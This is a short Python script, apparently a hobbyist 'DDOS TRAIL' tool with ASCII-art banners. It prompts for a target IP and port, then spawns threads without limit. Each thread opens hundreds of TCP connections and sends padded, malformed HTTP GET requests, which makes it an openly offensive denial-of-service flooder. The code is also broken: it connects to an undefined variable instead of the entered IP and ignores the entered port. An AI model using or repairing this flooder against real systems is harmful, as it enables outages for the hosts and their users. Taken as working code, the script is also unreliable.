from colorama import Fore,init
init()
print(Fore.BLUE+"     DDOS TRAIL ")



print(Fore.GREEN+"""

⠀#####    #####     ####     #####
 ######   ######   ######   ######
 ##  ##   ##  ##   ##  ##   ##
 ##  ##   ##  ##   ##  ##   ##
 ##  ##   ##  ##   ##  ##    ####
 ##  ##   ##  ##   ##  ##       ##
 #####    #####     ####    #####

""")
from colorama import Fore,init
init()
print(Fore.BLUE+"   DDOS TRAIL")



print(Fore.GREEN+"""

⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣤⣤
⠀⠀⢶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠠⠾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠛⠛⠋⠉⠀
⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⠏⢠⣿⡀⠀⠀⢹⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⣀⣙⣂⣠⠼⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠛⠛⠛⠛⠻⠿⠛⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
""")
from colorama import Fore,init
init()
print(Fore.RED+"  ATATK")
print('')
Upto =input('  ATAK  ATAK   IP : ' )
print('')
ATTAK =input('  PORT   PORT : ' )
from socket import *
import time
import threading
def main():
    for i in range(1, 1000):
        s = socket(AF_INET , SOCK_STREAM)
        s.connect((u , 80))
        pack = b"A"*100
        request = "GET / HTTP 1.1\r\n".encode() + pack
        print("send")
        s.send(request)

while True:
    t = threading.Thread(target=main)
    t.start()
